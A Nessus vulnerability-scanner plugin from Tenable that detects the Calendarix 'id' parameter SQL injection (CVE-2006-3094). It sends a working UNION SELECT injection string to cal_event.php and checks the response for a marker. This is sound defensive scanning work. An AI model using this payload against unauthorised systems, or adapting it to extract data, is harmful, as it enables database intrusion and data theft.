#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21727);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-3094");
  script_bugtraq_id(18469);
  script_osvdb_id(26528, 26529);

  script_name(english:"Calendarix Multiple Script id Parameter SQL Injection");
  script_summary(english:"Checks for id parameter SQL injection in Calendarix");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to multiple SQL injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Calendarix, a free web-based calendar
application written in PHP. 

The version of Calendarix installed on the remote host fails to
sanitize input to the 'id' parameter to the 'cal_event.php' and
'cal_popup.php' scripts before using it in database queries.  Provided
PHP's 'magic_quotes_gpc' setting is disabled, an unauthenticated
attacker can exploit these flaws to manipulate database queries, which
may lead to disclosure of sensitive information, modification of data,
or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/437437/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/06/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/06/15");
 script_cvs_date("$Date: 2011/03/12 01:05:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


exploit = string("' UNION SELECT 1,2,'", SCRIPT_NAME, "',4,5,6,7,8,9,10,11,12,13--");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/calendarix", "/calendar", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  r = http_send_recv3(method:"GET", port: port, 
    item:string( dir, "/cal_event.php?",
      "id=1", urlencode(str:exploit) ));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our script name in the event title.
  if (string("<div class=popupeventtitlefont>", SCRIPT_NAME) >< res) {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
